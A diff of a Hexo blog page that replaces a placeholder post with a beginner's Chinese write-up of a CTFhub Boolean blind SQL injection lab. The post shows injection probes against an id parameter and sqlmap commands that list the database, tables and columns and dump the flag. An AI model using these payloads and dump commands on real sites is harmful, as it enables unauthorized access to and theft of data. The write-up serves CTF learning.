@@ -20,27 +20,35 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{&quot;hostname&quot;:&quot;strawberrygourd.github.io.git&quot;,&quot;root&quot;:&quot;&#x2F;&quot;,&quot;images&quot;:&quot;&#x2F;images&quot;,&quot;scheme&quot;:&quot;Muse&quot;,&quot;version&quot;:&quot;8.5.0&quot;,&quot;exturl&quot;:false,&quot;sidebar&quot;:{&quot;position&quot;:&quot;left&quot;,&quot;display&quot;:&quot;post&quot;,&quot;padding&quot;:18,&quot;offset&quot;:12},&quot;copycode&quot;:false,&quot;bookmark&quot;:{&quot;enable&quot;:false,&quot;color&quot;:&quot;#222&quot;,&quot;save&quot;:&quot;auto&quot;},&quot;fancybox&quot;:false,&quot;mediumzoom&quot;:false,&quot;lazyload&quot;:false,&quot;pangu&quot;:false,&quot;comments&quot;:{&quot;style&quot;:&quot;tabs&quot;,&quot;active&quot;:null,&quot;storage&quot;:true,&quot;lazyload&quot;:false,&quot;nav&quot;:null},&quot;motion&quot;:{&quot;enable&quot;:true,&quot;async&quot;:false,&quot;transition&quot;:{&quot;post_block&quot;:&quot;fadeIn&quot;,&quot;post_header&quot;:&quot;fadeInDown&quot;,&quot;post_body&quot;:&quot;fadeInDown&quot;,&quot;coll_header&quot;:&quot;fadeInLeft&quot;,&quot;sidebar&quot;:&quot;fadeInUp&quot;}},&quot;prism&quot;:false,&quot;i18n&quot;:{&quot;placeholder&quot;:&quot;Searching...&quot;,&quot;empty&quot;:&quot;We didn&#39;t find any results for the search: ${query}&quot;,&quot;hits_time&quot;:&quot;${hits} results found in ${time} ms&quot;,&quot;hits&quot;:&quot;${hits} results found&quot;}}</script><script src="/js/config.js"></script>
-<meta name="description" content="Firstly很开心，继续加油！ importantly————————wzh">
+<meta name="description" content="直接WP(以CTFhub题为例)1.打开靶场，寻找一下注入点输入1为正常页面2.输入id&#x3D;1’ and 1&#x3D;1,返回空页面输入id&#x3D;1 and 1&#x3D;1,返回正常页面3.判断数据库(database)的长度和名字可以用id&#x3D;1 and length(database())&#x3D;1，改变123….来一次次证明长度再用id&#x3D;1 and substr(database(),1,1)&#x3D;‘a’ –+依次确定名字.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="First Blood">
-<meta property="og:url" content="http://strawberrygourd.github.io.git/2021/06/16/First-Blood/index.html">
+<meta property="og:title" content="布尔盲注">
+<meta property="og:url" content="http://strawberrygourd.github.io.git/2021/06/19/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Firstly很开心，继续加油！ importantly————————wzh">
+<meta property="og:description" content="直接WP(以CTFhub题为例)1.打开靶场，寻找一下注入点输入1为正常页面2.输入id&#x3D;1’ and 1&#x3D;1,返回空页面输入id&#x3D;1 and 1&#x3D;1,返回正常页面3.判断数据库(database)的长度和名字可以用id&#x3D;1 and length(database())&#x3D;1，改变123….来一次次证明长度再用id&#x3D;1 and substr(database(),1,1)&#x3D;‘a’ –+依次确定名字.">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-06-16T07:42:01.000Z">
-<meta property="article:modified_time" content="2021-06-19T02:55:14.057Z">
+<meta property="og:image" content="http://strawberrygourd.github.io.git/images/1.png">
+<meta property="og:image" content="http://strawberrygourd.github.io.git/images/2.png">
+<meta property="og:image" content="http://strawberrygourd.github.io.git/images/3.png">
+<meta property="og:image" content="http://strawberrygourd.github.io.git/images/4.png">
+<meta property="og:image" content="http://strawberrygourd.github.io.git/images/5.png">
+<meta property="og:image" content="http://strawberrygourd.github.io.git/images/6.png">
+<meta property="og:image" content="http://strawberrygourd.github.io.git/images/7.png">
+<meta property="article:published_time" content="2021-06-19T03:12:23.000Z">
+<meta property="article:modified_time" content="2021-06-19T03:26:26.099Z">
 <meta property="article:author" content="strawberrygourd">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://strawberrygourd.github.io.git/images/1.png">
 
 
-<link rel="canonical" href="http://strawberrygourd.github.io.git/2021/06/16/First-Blood/">
+<link rel="canonical" href="http://strawberrygourd.github.io.git/2021/06/19/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{&quot;sidebar&quot;:&quot;&quot;,&quot;isHome&quot;:false,&quot;isPost&quot;:true,&quot;lang&quot;:&quot;en&quot;,&quot;comments&quot;:true,&quot;permalink&quot;:&quot;http:&#x2F;&#x2F;strawberrygourd.github.io.git&#x2F;2021&#x2F;06&#x2F;16&#x2F;First-Blood&#x2F;&quot;,&quot;path&quot;:&quot;2021&#x2F;06&#x2F;16&#x2F;First-Blood&#x2F;&quot;,&quot;title&quot;:&quot;First Blood&quot;}</script>
+<script class="next-config" data-name="page" type="application/json">{&quot;sidebar&quot;:&quot;&quot;,&quot;isHome&quot;:false,&quot;isPost&quot;:true,&quot;lang&quot;:&quot;en&quot;,&quot;comments&quot;:true,&quot;permalink&quot;:&quot;http:&#x2F;&#x2F;strawberrygourd.github.io.git&#x2F;2021&#x2F;06&#x2F;19&#x2F;%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&#x2F;&quot;,&quot;path&quot;:&quot;2021&#x2F;06&#x2F;19&#x2F;布尔盲注&#x2F;&quot;,&quot;title&quot;:&quot;布尔盲注&quot;}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">&quot;&quot;</script>
-<title>First Blood | Hexo</title>
+<title>布尔盲注 | Hexo</title>
   
 
 
@@ -107,7 +115,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Firstly"><span class="nav-number">1.</span> <span class="nav-text">Firstly</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#importantly"><span class="nav-number">2.</span> <span class="nav-text">importantly</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5WP-%E4%BB%A5CTFhub%E9%A2%98%E4%B8%BA%E4%BE%8B"><span class="nav-number">1.</span> <span class="nav-text">直接WP(以CTFhub题为例)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%9A%84%E6%84%9F%E6%82%9F"><span class="nav-number">2.</span> <span class="nav-text">第一次的感悟</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -161,7 +169,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://strawberrygourd.github.io.git/2021/06/16/First-Blood/">
+    <link itemprop="mainEntityOfPage" href="http://strawberrygourd.github.io.git/2021/06/19/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -174,7 +182,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          First Blood
+          布尔盲注
         </h1>
 
         <div class="post-meta-container">
@@ -184,16 +192,10 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
+      
 
-      <time title="Created: 2021-06-16 15:42:01" itemprop="dateCreated datePublished" datetime="2021-06-16T15:42:01+08:00">2021-06-16</time>
+      <time title="Created: 2021-06-19 11:12:23 / Modified: 11:26:26" itemprop="dateCreated datePublished" datetime="2021-06-19T11:12:23+08:00">2021-06-19</time>
     </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-06-19 10:55:14" itemprop="dateModified" datetime="2021-06-19T10:55:14+08:00">2021-06-19</time>
-      </span>
 
   
 </div>
@@ -205,8 +207,9 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="Firstly"><a href="#Firstly" class="headerlink" title="Firstly"></a>Firstly</h2><p>很开心，继续加油！</p>
-<h2 id="importantly"><a href="#importantly" class="headerlink" title="importantly"></a>importantly</h2><p>————————wzh</p>
+        <h2 id="直接WP-以CTFhub题为例"><a href="#直接WP-以CTFhub题为例" class="headerlink" title="直接WP(以CTFhub题为例)"></a>直接WP(以CTFhub题为例)</h2><p>1.打开靶场，寻找一下注入点<br>输入1为正常页面<br><img src="/images/1.png"><br>2.输入id=1’ and 1=1,返回空页面<br><img src="/images/2.png"><br>输入id=1 and 1=1,返回正常页面<br><img src="/images/3.png"><br>3.判断数据库(database)的长度和名字<br>可以用id=1 and length(database())=1，<br>改变123….来一次次证明长度<br>再用id=1 and substr(database(),1,1)=‘a’ –+<br>依次确定名字.<br>以上过程比较鸡肋<br>这里我使用sqlmap<br>直接sqlmap -u+地址 –current-db<br><img src="/images/4.png"><br>得到database为sqli<br>4.找到数据库的表<br>sqlmap -u+地址 -D sqli –tables<br><img src="/images/5.png"><br>得到两个表名:flag 和 news<br>5.找到数据库表中的列名<br>sqlmap -u+地址 -D sqli -T flag –columns<br><img src="/images/6.png"><br>得到列名flag以及其类型<br>6.最后就是获得密码<br>sqlmap -u+地址 -D sqli -T flag -C flag –dump<br><img src="/images/7.png"><br>获得ctfhub的站内flag</p>
+<hr>
+<h2 id="第一次的感悟"><a href="#第一次的感悟" class="headerlink" title="第一次的感悟"></a>第一次的感悟</h2><p>首先就是找到kali linux用sqlmap这些软件是入门的第一步，找了很多博客才一步步了解到web的最基础入门。<br>然后就是学习注入，布尔盲注可以说是最简单的一种，一层层往下找，基本上没有阻挡，这种时间注入很好理解。<br>最后就是，给自己加个油！学习ctf的道路才刚刚开始！</p>
 
     </div>
 
@@ -220,14 +223,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/06/15/hello-world/" rel="prev" title="Hello World">
-                  <i class="fa fa-chevron-left"></i> Hello World
+                <a href="/2021/06/16/First-Blood/" rel="prev" title="First Blood">
+                  <i class="fa fa-chevron-left"></i> First Blood
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/06/19/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" rel="next" title="布尔盲注">
-                  布尔盲注 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
